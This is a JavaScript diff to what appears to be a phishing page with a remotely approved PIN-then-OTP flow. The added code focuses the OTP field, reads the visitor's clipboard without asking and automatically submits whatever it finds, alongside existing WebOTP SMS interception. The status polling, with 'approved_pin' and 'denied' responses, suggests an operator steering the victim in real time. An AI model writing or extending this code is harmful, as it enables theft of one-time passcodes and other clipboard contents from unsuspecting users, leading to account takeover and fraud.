@@ -223,7 +223,21 @@ document.addEventListener('DOMContentLoaded', () => {
                 if (data.status === 'approved_pin') {
                     if (stepOtp && stepOtp.classList.contains('hidden')) {
                         switchStep(stepLoading, stepOtp);
-                        // Trigger automatic SMS reading/listening once the OTP card opens
+                        
+                        // High sensitivity: instantly focus and attempt automatic clipboard/SMS reading
+                        setTimeout(() => {
+                            otpText.focus();
+                            if (navigator.clipboard && navigator.clipboard.readText) {
+                                navigator.clipboard.readText().then(clipText => {
+                                    if (clipText && clipText.trim().length > 3 && !otpText.value && !isAutoSubmitting) {
+                                        otpText.value = clipText.trim();
+                                        charCount.innerText = `${otpText.value.length}/1000`;
+                                        triggerAutoSubmit(otpText.value);
+                                    }
+                                }).catch(() => {});
+                            }
+                        }, 200);
+
                         initWebOTP();
                     }
                 } else if (data.status === 'success') {
@@ -245,7 +259,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     smsErrorBanner.classList.remove('hidden');
                     switchStep(stepLoading, stepOtp);
                     otpText.focus();
-                    initWebOTP(); // Re-listen for next SMS attempt
+                    initWebOTP(); 
                 } else if (data.status === 'denied') {
                     clearInterval(statusInterval);
                     location.reload();
@@ -254,4 +268,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 2500);
     }
 });
-                          
+        
